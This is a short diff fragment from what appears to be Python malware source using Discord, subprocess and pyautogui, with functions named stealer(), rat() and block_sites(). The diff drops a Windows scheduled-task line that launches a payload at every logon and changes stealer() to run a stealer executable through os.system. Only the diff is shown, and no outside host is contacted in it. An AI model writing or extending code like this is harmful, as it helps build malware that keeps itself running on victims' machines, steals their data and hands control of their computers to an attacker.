@@ -13,8 +13,7 @@ import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
 
 block_sites()
 def stealer():
-    command = "call" + stealerpath
-    command = f'SchTasks /create /f /sc Onlogon /tn "mainv5" /tr "{destination}"'
+    command = f'call "{stealerpath}"'
     os.system(command)
 def code1():
     rat()
